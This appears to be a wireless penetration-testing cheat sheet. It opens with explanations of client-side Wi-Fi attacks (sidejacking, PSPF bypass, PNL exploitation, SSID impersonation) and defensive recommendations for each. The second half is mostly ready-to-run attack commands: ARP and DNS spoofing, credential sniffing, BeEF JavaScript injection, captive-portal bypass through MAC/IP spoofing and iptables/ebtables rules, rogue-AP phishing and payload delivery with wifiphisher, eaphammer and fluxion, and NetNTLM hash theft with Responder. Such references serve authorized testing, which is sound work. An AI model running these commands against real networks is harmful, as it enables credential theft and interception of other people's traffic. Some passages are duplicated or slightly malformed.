# Sidejacking (Client Attacks)
Sidejacking is a technique that exploits a security weakness in authenticated websites. When a user logs in, the connection is initially secure using HTTPS. However, after authentication, the connection is redirected to an unsecured HTTP connection. The initial cookie set during the secure HTTPS connection to keep track of the user's authenticated status is sent over HTTP, making it possible for an attacker to intercept and capture the cookie content. Sidejacking leverages a common vulnerability in authenticated websites where a user begins with a secure connection over HTTPS and redirects it to an HTTP connection after authentication. The initial cookie set during HTTPS authentication to track the authenticated status of the user is subsequently sent over HTTP for later site access, making it possible for an attacker to eavesdrop and capture the authenticated cookie content.

Recommendation: To compensate for the lack of Layer 2 security, organizations need to implement more robust defenses at the upper layers. One way to limit the SSIDs that client devices connect to is by utilizing Group Policy functions and forbidding the connection to the "ANY" SSID. By doing so, end-users won't be able to connect to wireless networks that are not considered trustworthy. Educating users on the significance of confirming the identity of digital certificates before supplying sensitive information, ensuring that the root or issuing authority for the digital certificate is trusted.

# PSPF - Bypass (Client Attacks)
Public Secure Packet Forwarding (PSPF) delivers a private VLAN for each 802.11 client, preventing two clients connected to the same access point from direct communication with each other. Layer 3 routing filters and access control lists allow selective communication between clients. Using IPSec augments security in open-authentication networks.
In a wireless/IPSec environment, all traffic should traverse the IPSec gateway for security, which prevents direct attacks on client systems. However, attackers can still inject packets into the wireless network using any spoofed source MAC address and conducting ARP poisoning/spoofing attacks in an attempt to bypass restrictions.

Recommendation: Utilize AP isolation on guest networks to isolate users from one another which also provides some protection against nefarious network users. AP Isolation is a wireless network security feature that isolates all connected clients from each other. Enabling this feature enhances network security by reducing the possibility of unauthorized access to data or devices within the network.

# PNL Exploitation (Client Attacks)
The Preferred Network List (PNL) is a list of network SSIDs and one or more other SSIDs used by the network SSID. The entries in the PNL are not a secret. However, all wireless clients will periodically scan for the presence of any available access points using the SSIDs in the PNL as part of the access point selection process. An attacker passively sniffing the network can observe these probe request frames and extract the SSIDs transmitted in plaintext to produce a list of SSIDs in the station's PNL.

Recommendation: Currently, device manufacturers are working on addressing this vulnerability. Configuring devices to send probe requests without specified SSIDs; all APs respond. Randomizing MAC addresses in probe requests helps mitigate certain privacy risks associated with tracking the station's MAC address as it moves around an environment. Limit SSIDs in PNL with Group Policy, assuming users do not have administrator access to their systems. 

# Multiple SSID Impersonation (Client Attacks)
To impersonate multiple SSIDs, an attacker uses a particular wireless driver in master mode and responds to all probe requests regardless of their SSIDs. The attacker then attempts to lure client devices into a fake access point established to manipulate and compromise them.

Recommendation: Ensure client devices maintain current patch levels. Use strong Layer 2 encryption, such as WPA or WPA2, which offers strong support for the privacy of wireless traffic and assists in mitigating some client-specific attacks. Deploy wireless IDSs (WIDS). Dedicated wireless IDSs can monitor for attacks and anomalous conditions that could indicate the presence of a zero-day attack, allowing administrators to detect and react to attacks.

### Standard MiTM Attacks
      ARP Spoofing: Bettercap > arp.spoof module
      (Not needed when client connected to rogue AP because attacker already in position of MitM)
         
      DNS Spoofing: Bettercap > dns.spoof module
      
      Credentials Sniffing:
         Bettercap > net.sniff module
         $ sudo pipenv run python Pcredz -i wlan0mon -v
         $ python net-creds.py -I <interface>
         $ dsniff -i <interface>
         
    JS Injection: Bettercap > caplet beef-active

### Captive Portal Attacks
  MAC-based Authorization:
  
      1. Sniff network to find an authorized client identified by its MAC address
      2. Change interface MAC address:
         $ ifconfig wlan0 hw ether <authorized_MAC_Address> 
  
  IP-based Authorization:
  
    1. Activate IP forwarding
      $ echo 1 > /proc/sys/net/ipv4/ip_forward
      
    2. MiTM (ARP cache poisoning) between gateway & authorized client
      $ ettercap -T -q -i wlan0 -w dump -M ARP /<IP_authorized_client>/ /<IP_gateway>/
      
    3. All packets sent from the attacker will have to spoof the authorized client IP except for packets going in the LAN
      $ iptables -t nat -A OUTPUT -d ! <LAN> -j SNAT –to <IP_authorized_client>
      
    4. Increments TTL
      $ iptables -t mangle -A FORWARD -d -j TTL --ttl-inc 1;  
  
  MAC+IP-based Authorization:
  
    1. Turn interface into bridge mode:
      $ modprobe bridge
      $ brctl addbr br0
      $ brctl addif br0 <interface> 
      
    2. All frames sent by attacker to the gateway will have a spoofed source MAC address:
      $ ebtables -t nat -A POSTROUTING -o <interface> -d <MAC_gateway> -j snat –to-source <MAC_authorized_client>
      
    3. Then apply method for IP-based Authorization bypass 
  
  Phishing (Social Engineering):
  
    $ wifiphisher -aI <interface_rogue_AP> -eI <interface_deauthenticating> -iI <internet_interface> \ -p firmware-upgrade --handshake-capture handshake.pcap --essid <target_SSID> -kN
    $ wifipumpkin3 --xpulp "set interface wlan0; set ssid <SSID>; set proxy captiveflask; start"
    $ eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID> --captive-portal
    $ airgeddon.sh
    $ fluxion.sh
  
  Payload Delivery:
  
    $ wifiphisher -aI <interface_rogue_AP> -jI <interface_jamming> -p plugin_update --handshake-capture handshake.pcap -kN

### NetNTLM Hash Stealing
   Hostile Portal Attack (Redirect to SMB)
   
      $ eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID> --hostile-portal
        (HTTP traffic redirected to SMB share on attacker's machine)
      
    NBT-NS/LLMNR Poisoning
      $ Responder.py -I <interface> -wrf
